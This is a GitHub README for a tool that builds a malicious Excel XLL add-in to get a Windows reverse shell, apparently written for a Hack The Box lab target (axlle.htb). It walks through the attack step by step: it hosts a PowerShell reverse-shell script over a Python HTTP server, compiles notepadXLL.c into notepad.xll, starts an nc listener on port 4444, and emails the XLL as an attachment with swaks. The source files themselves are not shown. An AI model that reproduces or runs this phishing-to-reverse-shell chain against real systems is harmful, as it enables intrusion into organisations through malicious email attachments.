# xll_windows_reverse_shell
xll windows reverse shell



In your Attacker (Kali) machine:
```
git clone https://github.com/c0d3cr4f73r/xll_windows_reverse_shell.git
```
1. Update the `revsh.ps1`

```
python3 -m http.server 9999
```

In your Attacker (Windows) machine:

1. Move `notpadXLL.c` to your windows attacker machine and update the Update the `notpadXLL.c` accordingly.
3. Open `x64 Native Tools Command Prompt for VS 2022`
4. run below command to genarte `notepad.xll`
```
cl.exe /LD notepadXLL.c /link /out:notepad.xll
```

![image](https://github.com/c0d3cr4f73r/xll_windows_reverse_shell/assets/66146701/fa052809-575a-480f-be6d-0ba6b7e2dde0)


5. move this `notepad.xll` to your Kali machine
6. download `swaks`
```
 curl -O https://jetmore.org/john/code/swaks/files/swaks-20240103.0/swaks
```

7. configure nc listner

```
nc -nlvp 4444
```

8. Use `swaks` to send an email with notepad.xll attached:
```
./swaks --to accounts@axlle.htb --from ihatethisbox@fuckhtb.htb --server 10.10.11.21 --port 25 --header "Subject: test" --body "test" --attach @notepad.xll
```

![image](https://github.com/c0d3cr4f73r/xll_windows_reverse_shell/assets/66146701/e0c783a7-47ba-4a05-95aa-8e8c29ce0791)

